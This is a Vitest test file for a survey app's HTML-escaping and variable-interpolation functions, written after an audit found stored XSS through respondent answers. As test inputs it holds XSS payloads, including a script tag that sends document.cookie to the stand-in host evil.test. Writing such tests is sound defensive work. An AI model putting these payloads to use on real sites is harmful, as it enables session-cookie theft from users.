import { describe, it, expect } from 'vitest';
import { escapeHtml, interpolateWithMap, interpolateWithMapForHtml } from '@/lib/survey-variable-utils';

/**
 * Audit F5: survey content is sanitised on write, but variable substitution happens
 * afterwards on read. A respondent's answer spliced into an already-sanitised template
 * reintroduces arbitrary markup, and the result reaches dangerouslySetInnerHTML.
 */
describe('escapeHtml', () => {
  it('neutralises the characters that can open a tag or attribute', () => {
    expect(escapeHtml('<img src=x onerror="alert(1)">')).toBe(
      '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;',
    );
  });

  it('escapes ampersands first so entities are not double-decoded', () => {
    expect(escapeHtml('&lt;script&gt;')).toBe('&amp;lt;script&amp;gt;');
  });

  it('escapes single quotes, which can break out of attribute values', () => {
    expect(escapeHtml("' onmouseover='alert(1)")).toBe(
      '&#39; onmouseover=&#39;alert(1)',
    );
  });

  it('renders nullish values as an empty string rather than "null"', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });

  it('coerces non-strings without throwing', () => {
    expect(escapeHtml(42)).toBe('42');
    expect(escapeHtml(true)).toBe('true');
  });
});

describe('interpolateWithMapForHtml', () => {
  it('escapes a respondent answer spliced into the template', () => {
    const template = 'Thanks {{q1}}!';
    const values = { q1: '<img src=x onerror=alert(1)>' };

    const out = interpolateWithMapForHtml(template, values);

    expect(out).toBe('Thanks &lt;img src=x onerror=alert(1)&gt;!');
    expect(out).not.toContain('<img');
  });

  it('leaves authored markup in the template intact', () => {
    const template = '<strong>Thanks</strong> {{q1}}';
    const values = { q1: 'Ada' };

    expect(interpolateWithMapForHtml(template, values)).toBe(
      '<strong>Thanks</strong> Ada',
    );
  });

  it('blocks a script tag submitted as an answer', () => {
    const out = interpolateWithMapForHtml('{{q1}}', {
      q1: '<script>fetch("//evil.test?c="+document.cookie)</script>',
    });

    expect(out).not.toContain('<script');
    expect(out).toContain('&lt;script&gt;');
  });

  it('handles empty and missing templates', () => {
    expect(interpolateWithMapForHtml('', { q1: 'x' })).toBe('');
    expect(interpolateWithMapForHtml(undefined, { q1: 'x' })).toBe('');
    expect(interpolateWithMapForHtml(null, { q1: 'x' })).toBe('');
  });

  it('honours keepMissing for unresolved variables', () => {
    expect(interpolateWithMapForHtml('Hi {{missing}}', {}, true)).toBe('Hi {{missing}}');
  });

  it('differs from the unescaped variant, which is why the sink must use this one', () => {
    const template = 'Thanks {{q1}}!';
    const values = { q1: '<b>x</b>' };

    expect(interpolateWithMap(template, values)).toContain('<b>');
    expect(interpolateWithMapForHtml(template, values)).not.toContain('<b>');
  });
});
